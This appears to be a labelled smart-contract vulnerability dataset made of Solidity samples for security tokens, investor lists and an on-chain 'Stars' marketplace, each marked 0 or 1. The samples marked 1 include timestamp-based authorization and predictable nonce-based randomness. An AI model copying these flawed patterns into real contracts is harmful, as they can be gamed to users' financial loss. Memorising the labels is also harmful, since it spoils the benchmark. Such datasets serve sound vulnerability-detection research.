library SafeMath {             function mul(uint256 a, uint256 b)         internal         pure         returns (uint256 c)     {        if (a == 0) {            return 0;        }        c = a * b;        require(c / a == b, "SafeMath mul failed");        return c;    }         function sub(uint256 a, uint256 b)        internal        pure        returns (uint256)     {        require(b <= a, "SafeMath sub failed");        return a - b;    }         function add(uint256 a, uint256 b)        internal        pure        returns (uint256 c)     {        c = a + b;        require(c >= a, "SafeMath add failed");        return c;    }             function sqrt(uint256 x)        internal        pure        returns (uint256 y)     {        uint256 z = ((add(x,1)) / 2);        y = x;        while (z < y)         {            y = z;            z = ((add((x / z),z)) / 2);        }    }             function sq(uint256 x)        internal        pure        returns (uint256)    {        return (mul(x,x));    }             function pwr(uint256 x, uint256 y)        internal         pure         returns (uint256)    {        if (x==0)            return (0);        else if (y==0)            return (1);        else         {            uint256 z = x;            for (uint256 i=1; i < y; i++)                z = mul(z,x);            return (z);        }    }}
0<CODESPLIT>contract IInvestorList {    string public constant ROLE_REGD = "regd";    string public constant ROLE_REGCF = "regcf";    string public constant ROLE_REGS = "regs";    string public constant ROLE_UNKNOWN = "unknown";    function inList(address addr) public view returns (bool);    function addAddress(address addr, string role) public;    function getRole(address addr) public view returns (string);    function hasRole(address addr, string role) public view returns (bool);}
0<CODESPLIT>contract AffiliateList is Ownable, IAffiliateList {    event AffiliateAdded(address addr, uint startTimestamp, uint endTimestamp);    event AffiliateUpdated(address addr, uint startTimestamp, uint endTimestamp);    mapping (address => uint) public affiliateStart;    mapping (address => uint) public affiliateEnd;    function set(address addr, uint startTimestamp, uint endTimestamp) public onlyOwner {        require(addr != address(0));        uint existingStart = affiliateStart[addr];        if(existingStart == 0) {                         require(startTimestamp != 0);            affiliateStart[addr] = startTimestamp;            if(endTimestamp != 0) {                require(endTimestamp > startTimestamp);                affiliateEnd[addr] = endTimestamp;            }            emit AffiliateAdded(addr, startTimestamp, endTimestamp);        }        else {                         if(startTimestamp == 0) {                                 if(endTimestamp == 0) {                    affiliateStart[addr] = 0;                    affiliateEnd[addr] = 0;                }                else {                    require(endTimestamp > existingStart);                }            }            else {                                 affiliateStart[addr] = startTimestamp;                if(endTimestamp != 0) {                    require(endTimestamp > startTimestamp);                }            }            affiliateEnd[addr] = endTimestamp;            emit AffiliateUpdated(addr, startTimestamp, endTimestamp);        }    }    function get(address addr) public view returns (uint start, uint end) {        return (affiliateStart[addr], affiliateEnd[addr]);    }    function inListAsOf(address addr, uint time) public view returns (bool) {        uint start;        uint end;        (start, end) = get(addr);        if(start == 0) {            return false;        }        if(time < start) {            return false;        }        if(end != 0 && time >= end) {            return false;        }        return true;    }}
0<CODESPLIT>contract InvestorList is Ownable, IInvestorList {    event AddressAdded(address addr, string role);    event AddressRemoved(address addr, string role);    mapping (address => string) internal investorList;         modifier validRole(string role) {        require(            keccak256(bytes(role)) == keccak256(bytes(ROLE_REGD)) ||            keccak256(bytes(role)) == keccak256(bytes(ROLE_REGCF)) ||            keccak256(bytes(role)) == keccak256(bytes(ROLE_REGS)) ||            keccak256(bytes(role)) == keccak256(bytes(ROLE_UNKNOWN))        );        _;    }         function inList(address addr)        public        view        returns (bool)    {        if (bytes(investorList[addr]).length != 0) {            return true;        } else {            return false;        }    }         function getRole(address addr)        public        view        returns (string)    {        require(inList(addr));        return investorList[addr];    }         function hasRole(address addr, string role)        public        view        returns (bool)    {        return keccak256(bytes(role)) == keccak256(bytes(investorList[addr]));    }         function addAddress(address addr, string role)        onlyOwner        validRole(role)        public    {        investorList[addr] = role;        emit AddressAdded(addr, role);    }         function addAddresses(address[] addrs, string role)        onlyOwner        validRole(role)        public    {        for (uint256 i = 0; i < addrs.length; i++) {            addAddress(addrs[i], role);        }    }         function removeAddress(address addr)        onlyOwner        public    {                 require(inList(addr));        string memory role = investorList[addr];        investorList[addr] = "";        emit AddressRemoved(addr, role);    }         function removeAddresses(address[] addrs)        onlyOwner        public    {        for (uint256 i = 0; i < addrs.length; i++) {            if (inList(addrs[i])) {                removeAddress(addrs[i]);            }        }    }}library SafeMath {         function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {        if (a == 0) {            return 0;        }        c = a * b;        assert(c / a == b);        return c;    }         function div(uint256 a, uint256 b) internal pure returns (uint256) {                                   return a / b;    }         function sub(uint256 a, uint256 b) internal pure returns (uint256) {        assert(b <= a);        return a - b;    }         function add(uint256 a, uint256 b) internal pure returns (uint256 c) {        c = a + b;        assert(c >= a);        return c;    }}
0<CODESPLIT>contract ISecurityController {    function balanceOf(address _a) public view returns (uint);    function totalSupply() public view returns (uint);    function isTransferAuthorized(address _from, address _to) public view returns (bool);    function setTransferAuthorized(address from, address to, uint expiry) public;    function transfer(address _from, address _to, uint _value) public returns (bool success);    function transferFrom(address _spender, address _from, address _to, uint _value) public returns (bool success);    function allowance(address _owner, address _spender) public view returns (uint);    function approve(address _owner, address _spender, uint _value) public returns (bool success);    function increaseApproval(address _owner, address _spender, uint _addedValue) public returns (bool success);    function decreaseApproval(address _owner, address _spender, uint _subtractedValue) public returns (bool success);    function burn(address _owner, uint _amount) public;    function ledgerTransfer(address from, address to, uint val) public;    function setLedger(address _ledger) public;    function setSale(address _sale) public;    function setToken(address _token) public;    function setAffiliateList(address _affiliateList) public;}
1<CODESPLIT>contract SecurityController is ISecurityController, Ownable {    ISecurityLedger public ledger;    ISecurityToken public token;    ISecuritySale public sale;    IInvestorList public investorList;    ITransferAuthorizations public transferAuthorizations;    IAffiliateList public affiliateList;    uint public lockoutPeriod = 10 * 60 * 60;           mapping(address => bool) public transferAuthPermission;    constructor() public {    }    function setTransferAuthorized(address from, address to, uint expiry) public {                 require(transferAuthPermission[msg.sender]);                 require(from != 0);                 if(expiry > 0) {            require(expiry > block.timestamp);            require(expiry <= (block.timestamp + 30 days));        }        transferAuthorizations.set(from, to, expiry);    }         function setLockoutPeriod(uint _lockoutPeriod) public onlyOwner {        lockoutPeriod = _lockoutPeriod;    }    function setToken(address _token) public onlyOwner {        token = ISecurityToken(_token);    }    function setLedger(address _ledger) public onlyOwner {        ledger = ISecurityLedger(_ledger);    }    function setSale(address _sale) public onlyOwner {        sale = ISecuritySale(_sale);    }    function setInvestorList(address _investorList) public onlyOwner {        investorList = IInvestorList(_investorList);    }    function setTransferAuthorizations(address _transferAuthorizations) public onlyOwner {        transferAuthorizations = ITransferAuthorizations(_transferAuthorizations);    }    function setAffiliateList(address _affiliateList) public onlyOwner {        affiliateList = IAffiliateList(_affiliateList);    }    function setDependencies(address _token, address _ledger, address _sale,        address _investorList, address _transferAuthorizations, address _affiliateList)        public onlyOwner    {        token = ISecurityToken(_token);        ledger = ISecurityLedger(_ledger);        sale = ISecuritySale(_sale);        investorList = IInvestorList(_investorList);        transferAuthorizations = ITransferAuthorizations(_transferAuthorizations);        affiliateList = IAffiliateList(_affiliateList);    }    function setTransferAuthPermission(address agent, bool hasPermission) public onlyOwner {        require(agent != address(0));        transferAuthPermission[agent] = hasPermission;    }    modifier onlyToken() {        require(msg.sender == address(token));        _;    }    modifier onlyLedger() {        require(msg.sender == address(ledger));        _;    }         function totalSupply() public view returns (uint) {        return ledger.totalSupply();    }    function balanceOf(address _a) public view returns (uint) {        return ledger.balanceOf(_a);    }    function allowance(address _owner, address _spender) public view returns (uint) {        return ledger.allowance(_owner, _spender);    }    function isTransferAuthorized(address _from, address _to) public view returns (bool) {                                   uint expiry = transferAuthorizations.get(_from, _to);        uint globalExpiry = transferAuthorizations.get(_from, 0);        if(globalExpiry > expiry) {            expiry = globalExpiry;        }        return expiry > block.timestamp;    }         function checkTransfer(address _from, address _to, uint _value, uint lockoutTime)        public        returns (bool canTransfer, bool useLockoutTime, bool newTokensAreRestricted, bool preservePurchaseDate) {                                                                                                           preservePurchaseDate = false;        bool transferIsAuthorized = isTransferAuthorized(_from, _to);        bool fromIsAffiliate = affiliateList.inListAsOf(_from, block.timestamp);        bool toIsAffiliate = affiliateList.inListAsOf(_to, block.timestamp);        if(transferIsAuthorized) {            canTransfer = true;            if(fromIsAffiliate || toIsAffiliate) {                newTokensAreRestricted = true;            }                                  }        else if(!fromIsAffiliate) {                         if(investorList.hasRole(_from, investorList.ROLE_REGS())                && investorList.hasRole(_to, investorList.ROLE_REGS())) {                canTransfer = true;                                                               }            else {                if(ledger.transferDryRun(_from, _to, _value, lockoutTime) == _value) {                    canTransfer = true;                    useLockoutTime = true;                                                          }            }        }    }                        function ledgerTransfer(address from, address to, uint val) public onlyLedger {        token.controllerTransfer(from, to, val);    }         function transfer(address _from, address _to, uint _value) public onlyToken returns (bool success) {        uint lockoutTime = block.timestamp - lockoutPeriod;        bool canTransfer;        bool useLockoutTime;        bool newTokensAreRestricted;        bool preservePurchaseDate;        (canTransfer, useLockoutTime, newTokensAreRestricted, preservePurchaseDate)            = checkTransfer(_from, _to, _value, lockoutTime);        if(!canTransfer) {            return false;        }        uint overrideLockoutTime = lockoutTime;        if(!useLockoutTime) {            overrideLockoutTime = 0;        }        return ledger.transfer(_from, _to, _value, overrideLockoutTime, newTokensAreRestricted, preservePurchaseDate);    }    function transferFrom(address _spender, address _from, address _to, uint _value) public onlyToken returns (bool success) {        uint lockoutTime = block.timestamp - lockoutPeriod;        bool canTransfer;        bool useLockoutTime;        bool newTokensAreRestricted;        bool preservePurchaseDate;        (canTransfer, useLockoutTime, newTokensAreRestricted, preservePurchaseDate)            = checkTransfer(_from, _to, _value, lockoutTime);        if(!canTransfer) {            return false;        }        uint overrideLockoutTime = lockoutTime;        if(!useLockoutTime) {            overrideLockoutTime = 0;        }        return ledger.transferFrom(_spender, _from, _to, _value, overrideLockoutTime, newTokensAreRestricted, preservePurchaseDate);    }    function approve(address _owner, address _spender, uint _value) public onlyToken returns (bool success) {        return ledger.approve(_owner, _spender, _value);    }    function increaseApproval (address _owner, address _spender, uint _addedValue) public onlyToken returns (bool success) {        return ledger.increaseApproval(_owner, _spender, _addedValue);    }    function decreaseApproval (address _owner, address _spender, uint _subtractedValue) public onlyToken returns (bool success) {        return ledger.decreaseApproval(_owner, _spender, _subtractedValue);    }    function burn(address _owner, uint _amount) public onlyToken {        ledger.burn(_owner, _amount);    }}interface ISecurityLedger {    function balanceOf(address _a) external view returns (uint);    function totalSupply() external view returns (uint);    function transferDryRun(address _from, address _to, uint amount, uint lockoutTime) external returns (uint transferrableCount);    function transfer(address _from, address _to, uint _value, uint lockoutTime, bool newTokensAreRestricted, bool preservePurchaseDate) external returns (bool success);    function transferFrom(address _spender, address _from, address _to, uint _value, uint lockoutTime, bool newTokensAreRestricted, bool preservePurchaseDate) external returns (bool success);    function allowance(address _owner, address _spender) external view returns (uint);    function approve(address _owner, address _spender, uint _value) external returns (bool success);    function increaseApproval(address _owner, address _spender, uint _addedValue) external returns (bool success);    function decreaseApproval(address _owner, address _spender, uint _subtractedValue) external returns (bool success);    function burn(address _owner, uint _amount) external;    function setController(address _controller) external;}
0<CODESPLIT>contract SecurityLedger is Ownable {    using SafeMath for uint256;    struct TokenLot {        uint amount;        uint purchaseDate;        bool restricted;    }    mapping(address => TokenLot[]) public tokenLotsOf;    SecurityController public controller;    mapping(address => uint) public balanceOf;    mapping (address => mapping (address => uint)) public allowance;    uint public totalSupply;    uint public mintingNonce;    bool public mintingStopped;    constructor() public {    }         function setController(address _controller) public onlyOwner {        controller = SecurityController(_controller);    }    function stopMinting() public onlyOwner {        mintingStopped = true;    }         function mint(address addr, uint value, uint timestamp) public onlyOwner {        require(!mintingStopped);        uint time = timestamp;        if(time == 0) {            time = block.timestamp;        }        balanceOf[addr] = balanceOf[addr].add(value);        tokenLotsOf[addr].push(TokenLot(value, time, true));        controller.ledgerTransfer(0, addr, value);        totalSupply = totalSupply.add(value);    }    function multiMint(uint nonce, uint256[] bits, uint timestamp) external onlyOwner {        require(!mintingStopped);        if (nonce != mintingNonce) return;        mintingNonce = mintingNonce.add(1);        uint256 lomask = (1 << 96) - 1;        uint created = 0;        uint time = timestamp;        if(time == 0) {            time = block.timestamp;        }        for (uint i = 0; i < bits.length; i++) {            address addr = address(bits[i]>>96);            uint value = bits[i] & lomask;            balanceOf[addr] = balanceOf[addr].add(value);            tokenLotsOf[addr].push(TokenLot(value, time, true));            controller.ledgerTransfer(0, addr, value);            created = created.add(value);        }        totalSupply = totalSupply.add(created);    }         function sendReceivedTokens(address token, address sender, uint amount) public onlyOwner {        ERC20Basic t = ERC20Basic(token);        require(t.transfer(sender, amount));    }         modifier onlyController() {        require(msg.sender == address(controller));        _;    }         function walkTokenLots(address from, address to, uint amount, uint lockoutTime, bool removeTokens,        bool newTokensAreRestricted, bool preservePurchaseDate)        internal returns (uint numTransferrableTokens)    {        TokenLot[] storage fromTokenLots = tokenLotsOf[from];        for(uint i=0; i<fromTokenLots.length; i++) {            TokenLot storage lot = fromTokenLots[i];            uint lotAmount = lot.amount;                         if(lotAmount == 0) {                continue;            }            if(lockoutTime > 0) {                                 if(lot.restricted && lot.purchaseDate > lockoutTime) {                    continue;                }            }            uint remaining = amount.sub(numTransferrableTokens);            if(lotAmount >= remaining) {                numTransferrableTokens = numTransferrableTokens.add(remaining);                if(removeTokens) {                    lot.amount = lotAmount.sub(remaining);                    if(to != address(0)) {                        if(preservePurchaseDate) {                            tokenLotsOf[to].push(TokenLot(remaining, lot.purchaseDate, newTokensAreRestricted));                        }                        else {                            tokenLotsOf[to].push(TokenLot(remaining, block.timestamp, newTokensAreRestricted));                        }                    }                }                break;            }                                      numTransferrableTokens = numTransferrableTokens.add(lotAmount);            if(removeTokens) {                lot.amount = 0;                if(to != address(0)) {                    if(preservePurchaseDate) {                        tokenLotsOf[to].push(TokenLot(lotAmount, lot.purchaseDate, newTokensAreRestricted));                    }                    else {                        tokenLotsOf[to].push(TokenLot(lotAmount, block.timestamp, newTokensAreRestricted));                    }                }            }        }    }    function transferDryRun(address from, address to, uint amount, uint lockoutTime) public onlyController returns (uint) {        return walkTokenLots(from, to, amount, lockoutTime, false, false, false);    }    function transfer(address _from, address _to, uint _value, uint lockoutTime, bool newTokensAreRestricted, bool preservePurchaseDate) public onlyController returns (bool success) {        if (balanceOf[_from] < _value) return false;                 uint tokensTransferred = walkTokenLots(_from, _to, _value, lockoutTime, true, newTokensAreRestricted, preservePurchaseDate);        require(tokensTransferred == _value);                 balanceOf[_from] = balanceOf[_from].sub(_value);        balanceOf[_to] = balanceOf[_to].add(_value);        return true;    }    function transferFrom(address _spender, address _from, address _to, uint _value, uint lockoutTime, bool newTokensAreRestricted, bool preservePurchaseDate) public onlyController returns (bool success) {        if (balanceOf[_from] < _value) return false;                 uint allowed = allowance[_from][_spender];        if (allowed < _value) return false;                 uint tokensTransferred = walkTokenLots(_from, _to, _value, lockoutTime, true, newTokensAreRestricted, preservePurchaseDate);        require(tokensTransferred == _value);                 balanceOf[_from] = balanceOf[_from].sub(_value);        balanceOf[_to] = balanceOf[_to].add(_value);        allowance[_from][_spender] = allowed.sub(_value);        return true;    }    function approve(address _owner, address _spender, uint _value) public onlyController returns (bool success) {                 if ((_value != 0) && (allowance[_owner][_spender] != 0)) {            return false;        }        allowance[_owner][_spender] = _value;        return true;    }    function increaseApproval (address _owner, address _spender, uint _addedValue) public onlyController returns (bool success) {        uint oldValue = allowance[_owner][_spender];        allowance[_owner][_spender] = oldValue.add(_addedValue);        return true;    }    function decreaseApproval (address _owner, address _spender, uint _subtractedValue) public onlyController returns (bool success) {        uint oldValue = allowance[_owner][_spender];        if (_subtractedValue > oldValue) {            allowance[_owner][_spender] = 0;        } else {            allowance[_owner][_spender] = oldValue.sub(_subtractedValue);        }        return true;    }    function burn(address _owner, uint _amount) public onlyController {        require(balanceOf[_owner] >= _amount);        balanceOf[_owner] = balanceOf[_owner].sub(_amount);                          walkTokenLots(_owner, address(0), _amount, 0, true, false, false);        totalSupply = totalSupply.sub(_amount);    }}interface ISecuritySale {    function setLive(bool newLiveness) external;    function setInvestorList(address _investorList) external;}
0<CODESPLIT>contract SecuritySale is Ownable {    bool public live;             IInvestorList public investorList;      event SaleLive(bool liveness);    event EtherIn(address from, uint amount);    event StartSale();    event EndSale();    constructor() public {        live = false;    }    function setInvestorList(address _investorList) public onlyOwner {        investorList = IInvestorList(_investorList);    }    function () public payable {        require(live);        require(investorList.inList(msg.sender));        emit EtherIn(msg.sender, msg.value);    }         function setLive(bool newLiveness) public onlyOwner {        if(live && !newLiveness) {            live = false;            emit EndSale();        }        else if(!live && newLiveness) {            live = true;            emit StartSale();        }    }         function withdraw() public onlyOwner {        msg.sender.transfer(address(this).balance);    }         function withdrawSome(uint value) public onlyOwner {        require(value <= address(this).balance);        msg.sender.transfer(value);    }         function withdrawTokens(address token) public onlyOwner {        ERC20Basic t = ERC20Basic(token);        require(t.transfer(msg.sender, t.balanceOf(this)));    }         function sendReceivedTokens(address token, address sender, uint amount) public onlyOwner {        ERC20Basic t = ERC20Basic(token);        require(t.transfer(sender, amount));    }}interface ISecurityToken {    function balanceOf(address addr) external view returns(uint);    function transfer(address to, uint amount) external returns(bool);    function controllerTransfer(address _from, address _to, uint _value) external;}
0<CODESPLIT>contract SecurityToken is Ownable{    using SafeMath for uint256;    ISecurityController public controller;         string public name;    string public symbol;    uint8 public decimals;    event Transfer(address indexed from, address indexed to, uint value);    event Approval(address indexed owner, address indexed spender, uint value);    constructor(string _name, string  _symbol, uint8 _decimals) public {        name = _name;        symbol = _symbol;        decimals = _decimals;    }         function setName(string _name) public onlyOwner {        name = _name;    }    function setSymbol(string _symbol) public onlyOwner {        symbol = _symbol;    }        function setController(address _c) public onlyOwner {        controller = ISecurityController(_c);    }         function sendReceivedTokens(address token, address sender, uint amount) public onlyOwner {        ERC20Basic t = ERC20Basic(token);        require(t.transfer(sender, amount));    }         function balanceOf(address a) public view returns (uint) {        return controller.balanceOf(a);    }    function totalSupply() public view returns (uint) {        return controller.totalSupply();    }    function allowance(address _owner, address _spender) public view returns (uint) {        return controller.allowance(_owner, _spender);    }    function burn(uint _amount) public {        controller.burn(msg.sender, _amount);        emit Transfer(msg.sender, 0x0, _amount);    }              modifier onlyPayloadSize(uint numwords) {        assert(msg.data.length >= numwords.mul(32).add(4));        _;    }    function isTransferAuthorized(address _from, address _to) public onlyPayloadSize(2) view returns (bool) {        return controller.isTransferAuthorized(_from, _to);    }    function transfer(address _to, uint _value) public onlyPayloadSize(2) returns (bool success) {        if (controller.transfer(msg.sender, _to, _value)) {            emit Transfer(msg.sender, _to, _value);            return true;        }        return false;    }    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3) returns (bool success) {        if (controller.transferFrom(msg.sender, _from, _to, _value)) {            emit Transfer(_from, _to, _value);            return true;        }        return false;    }    function approve(address _spender, uint _value) onlyPayloadSize(2) public returns (bool success) {        if (controller.approve(msg.sender, _spender, _value)) {            emit Approval(msg.sender, _spender, _value);            return true;        }        return false;    }    function increaseApproval (address _spender, uint _addedValue) public onlyPayloadSize(2) returns (bool success) {        if (controller.increaseApproval(msg.sender, _spender, _addedValue)) {            uint newval = controller.allowance(msg.sender, _spender);            emit Approval(msg.sender, _spender, newval);            return true;        }        return false;    }    function decreaseApproval (address _spender, uint _subtractedValue) public onlyPayloadSize(2) returns (bool success) {        if (controller.decreaseApproval(msg.sender, _spender, _subtractedValue)) {            uint newval = controller.allowance(msg.sender, _spender);            emit Approval(msg.sender, _spender, newval);            return true;        }        return false;    }         modifier onlyController() {        assert(msg.sender == address(controller));        _;    }    function controllerTransfer(address _from, address _to, uint _value) public onlyController {        emit Transfer(_from, _to, _value);    }    function controllerApprove(address _owner, address _spender, uint _value) public onlyController {        emit Approval(_owner, _spender, _value);    }}interface ITransferAuthorizations {    function setController(address _controller) external;    function get(address from, address to) external view returns (uint);    function set(address from, address to, uint expiry) external;}
0<CODESPLIT>contract TransferAuthorizations is Ownable, ITransferAuthorizations {         mapping(address => mapping(address => uint)) public authorizations;         address public controller;    event TransferAuthorizationSet(address from, address to, uint expiry);    function setController(address _controller) public onlyOwner {        controller = _controller;    }    modifier onlyController() {        assert(msg.sender == controller);        _;    }         function set(address from, address to, uint expiry) public onlyController {        require(from != 0);        authorizations[from][to] = expiry;        emit TransferAuthorizationSet(from, to, expiry);    }         function get(address from, address to) public view returns (uint) {        return authorizations[from][to];    }}
0<CODESPLIT>contract Control is Ownable {    function withdrawBalance(address recipient, uint256 value) external onlyOwner {        require(value > 0);        require(value < address(this).balance);        recipient.transfer(value);    }}
0<CODESPLIT>contract Priced is Ownable {    uint256 private price       = 500000000000000000;  // Basic price in wei    uint16  private zMax        = 1600;                // Max z for get price percent    uint256 private zPrice      = 25000000000000000;   // Price for each item in z index (in wei)    uint8   private commission  = 10;                  // Update commission in percent    function setPriceData(uint256 _price, uint16 _zMax, uint256 _zPrice, uint8 _commission) external onlyOwner {        price       = _price;        zMax        = _zMax;        zPrice      = _zPrice;        commission  = _commission;    }    function getCreatePrice(uint16 z, uint256 zCount) internal view returns(uint256) {        return ((price * uint256(Math.divide(int256(z), int256(zMax), 4))) / 10000) + (zPrice * zCount);    }    function getCommission(uint256 starPrice) internal view returns(uint256) {        return Math.percent(starPrice, commission);    }}
0<CODESPLIT>contract Storage {    struct Star {        address owner;   // Star owner        uint8   gid;     // Star galaxy id        uint8   zIndex;  // Star z        uint16  box;     // Current xy box         uint8   inbox;   // Random x-y in box        uint8   stype;   // Star type        uint8   color;   // Star color        uint256 price;   // Price for this star        uint256 sell;    // Sell price for this star        bool    deleted; // Star is deleted        string  name;    // User defined star name        string  message; // User defined message    }    Star[] internal stars;    mapping(uint8 => mapping(uint8 => uint16)) internal zCount;        mapping(uint8 => mapping(uint8 => mapping(uint16 => uint256))) private positions;        function addStar(address owner, uint8 gid, uint8 zIndex, uint16 box, uint8 inbox, uint8 stype, uint8 color, uint256 price) internal returns(uint256) {        Star memory _star = Star({            owner: owner,            gid: gid, zIndex: zIndex, box: box, inbox: inbox,            stype: stype, color: color,            price: price, sell: 0, deleted: false, name: "", message: ""        });        uint256 starId = stars.push(_star) - 1;        placeStar(gid, zIndex, box, starId);        return starId;    }    function placeStar(uint8 gid, uint8 zIndex, uint16 box, uint256 starId) private {        zCount[gid][zIndex]         = zCount[gid][zIndex] + 1;        positions[gid][zIndex][box] = starId;    }    function setStarNameMessage(uint256 starId, string name, string message) internal {        stars[starId].name    = name;        stars[starId].message = message;    }    function setStarNewOwner(uint256 starId, address newOwner) internal {        stars[starId].owner = newOwner;    }    function setStarSellPrice(uint256 starId, uint256 sellPrice) internal {        stars[starId].sell = sellPrice;    }    function setStarDeleted(uint256 starId) internal {        stars[starId].deleted = true;        setStarSellPrice(starId, 0);        setStarNameMessage(starId, "", "");        setStarNewOwner(starId, address(0));        Star storage _star = stars[starId];        zCount[_star.gid][_star.zIndex]               = zCount[_star.gid][_star.zIndex] - 1;        positions[_star.gid][_star.zIndex][_star.box] = 0;    }    function getStar(uint256 starId) external view returns(address owner, uint8 gid, uint8 zIndex, uint16 box, uint8 inbox,                                                           uint8 stype, uint8 color,                                                           uint256 price, uint256 sell, bool deleted,                                                           string name, string message) {        Star storage _star = stars[starId];        owner      = _star.owner;        gid        = _star.gid;        zIndex     = _star.zIndex;        box        = _star.box;        inbox      = _star.inbox;        stype      = _star.stype;        color      = _star.color;        price      = _star.price;        sell       = _star.sell;        deleted    = _star.deleted;        name       = _star.name;        message    = _star.message;    }    function getStarIdAtPosition(uint8 gid, uint8 zIndex, uint16 box) internal view returns(uint256) {        return positions[gid][zIndex][box];    }    function starExists(uint256 starId) internal view returns(bool) {        return starId > 0 && starId < stars.length && stars[starId].deleted == false;    }    function isStarOwner(uint256 starId, address owner) internal view returns(bool) {        return stars[starId].owner == owner;    }}
1<CODESPLIT>contract Validation is Priced, Storage {    uint8   private gidMax     = 5;    uint16  private zMin       = 100;    uint16  private zMax       = 1600;    uint8   private lName      = 25;    uint8   private lMessage   = 140;    uint8   private maxCT      = 255; // Max color, types    uint256 private nonce      = 1;    uint8   private maxIRandom = 4;    uint16  private boxSize    = 20;  // Universe box size    uint8   private inboxXY    = 100;    mapping(uint8 => uint16) private boxes;    function setValidationData(uint16 _zMin, uint16 _zMax, uint8 _lName, uint8 _lMessage, uint8 _maxCT, uint8 _maxIR, uint16 _boxSize) external onlyOwner {        zMin       = _zMin;        zMax       = _zMax;        lName      = _lName;        lMessage   = _lMessage;        maxCT      = _maxCT;        maxIRandom = _maxIR;        boxSize    = _boxSize;        inboxXY    = uint8((boxSize * boxSize) / 4);    }    function setGidMax(uint8 _gidMax) external onlyOwner {        gidMax = _gidMax;    }    function setBoxCount(uint16 z, uint16 count) external onlyOwner {        require(isValidZ(z));        boxes[getZIndex(z)] = count;    }    function getBoxCount(uint16 z) external view returns(uint16 count) {        require(isValidZ(z));        return boxes[getZIndex(z)];    }    function getBoxCountZIndex(uint8 zIndex) private view returns(uint16 count) {        return boxes[zIndex];    }    function getZIndex(uint16 z) internal view returns(uint8 zIndex) {        return uint8(z / boxSize);    }    function getZCount(uint8 gid, uint8 zIndex) public view returns(uint16 count) {        return zCount[gid][zIndex];    }        function isValidGid(uint8 gid) internal view returns(bool) {        return gid > 0 && gid <= gidMax;    }    function isValidZ(uint16 z) internal view returns(bool) {        return z >= zMin && z <= zMax;    }    function isValidBox(uint8 gid, uint8 zIndex, uint16 box) internal view returns(bool) {        return getStarIdAtPosition(gid, zIndex, box) == 0;    }    function isValidNameLength(string name) internal view returns(bool) {        return UTF8.getStringLength(name) <= lName;    }    function isValidMessageLength(string message) internal view returns(bool) {        return UTF8.getStringLength(message) <= lMessage;    }    function isValidMsgValue(uint256 price) internal returns(bool) {        if (msg.value < price) return false;        if (msg.value > price)            msg.sender.transfer(msg.value - price);        return true;    }    function getRandom16(uint16 min, uint16 max) private returns(uint16) {        nonce++;        return Math.rand16(nonce, min, max);    }    function getRandom8(uint8 min, uint8 max) private returns(uint8) {        nonce++;        return Math.rand8(nonce, min, max);    }    function getRandomColorType() internal returns(uint8) {        return getRandom8(0, maxCT);    }    function getRandomPosition(uint8 gid, uint8 zIndex) internal returns(uint16 box, uint8 inbox) {        uint16 boxCount = getBoxCountZIndex(zIndex);        uint16 randBox  = 0;        if (boxCount == 0) revert();        uint8 ii   = maxIRandom;        bool valid = false;        while (!valid && ii > 0) {            randBox = getRandom16(0, boxCount);            valid   = isValidBox(gid, zIndex, randBox);            ii--;        }        if (!valid) revert();        return(randBox, getRandom8(0, inboxXY));    }}
0<CODESPLIT>contract Stars is Control, Validation {    event StarCreated(uint256 starId);    event StarUpdated(uint256 starId, uint8 reason);    event StarDeleted(uint256 starId, address owner);    event StarSold   (uint256 starId, address seller, address buyer, uint256 price);    event StarGifted (uint256 starId, address sender, address recipient);    function Stars() public {        uint256 starId = addStar(address(0), 0, 0, 0, 0, 0, 0, 0);        setStarNameMessage(starId, "Universe", "Big Bang!");    }    function createStar(uint8 gid, uint16 z, string name, string message) external payable {        require(isValidGid(gid));        require(isValidZ(z));        require(isValidNameLength(name));        require(isValidMessageLength(message));        uint8   zIndex    = getZIndex(z);        uint256 starPrice = getCreatePrice(z, getZCount(gid, zIndex));        require(isValidMsgValue(starPrice));        uint256 starId = newStar(gid, zIndex, starPrice);        setStarNameMessage(starId, name, message);        emit StarCreated(starId);    }    function newStar(uint8 gid, uint8 zIndex, uint256 price) private returns(uint256 starId) {        uint16 box; uint8 inbox;        uint8   stype  = getRandomColorType();        uint8   color  = getRandomColorType();        (box, inbox)   = getRandomPosition(gid, zIndex);        starId         = addStar(msg.sender, gid, zIndex, box, inbox, stype, color, price);    }    function updateStar(uint256 starId, string name, string message) external payable {        require(starExists(starId));        require(isStarOwner(starId, msg.sender));        require(isValidNameLength(name));        require(isValidMessageLength(message));                uint256 commission = getCommission(stars[starId].price);        require(isValidMsgValue(commission));        setStarNameMessage(starId, name, message);        emit StarUpdated(starId, 1);    }        function deleteStar(uint256 starId) external payable {        require(starExists(starId));        require(isStarOwner(starId, msg.sender));        uint256 commission = getCommission(stars[starId].price);        require(isValidMsgValue(commission));        setStarDeleted(starId);        emit StarDeleted(starId, msg.sender);    }        function sellStar(uint256 starId, uint256 sellPrice) external {        require(starExists(starId));        require(isStarOwner(starId, msg.sender));        require(sellPrice < 10**28);        setStarSellPrice(starId, sellPrice);        emit StarUpdated(starId, 2);    }        function giftStar(uint256 starId, address recipient) external payable {        require(starExists(starId));        require(recipient != address(0));        require(isStarOwner(starId, msg.sender));        require(!isStarOwner(starId, recipient));        uint256 commission = getCommission(stars[starId].price);        require(isValidMsgValue(commission));        setStarNewOwner(starId, recipient);        setStarSellPrice(starId, 0);        emit StarGifted(starId, msg.sender, recipient);        emit StarUpdated(starId, 3);    }        function buyStar(uint256 starId, string name, string message) external payable {        require(starExists(starId));        require(!isStarOwner(starId, msg.sender));        require(stars[starId].sell > 0);        uint256 commission = getCommission(stars[starId].price);        uint256 starPrice  = stars[starId].sell;        uint256 totalPrice = starPrice + commission;        require(isValidMsgValue(totalPrice));        address seller = stars[starId].owner;        seller.transfer(starPrice);        setStarNewOwner(starId, msg.sender);        setStarSellPrice(starId, 0);        setStarNameMessage(starId, name, message);        emit StarSold(starId, seller, msg.sender, starPrice);        emit StarUpdated(starId, 4);    }        }
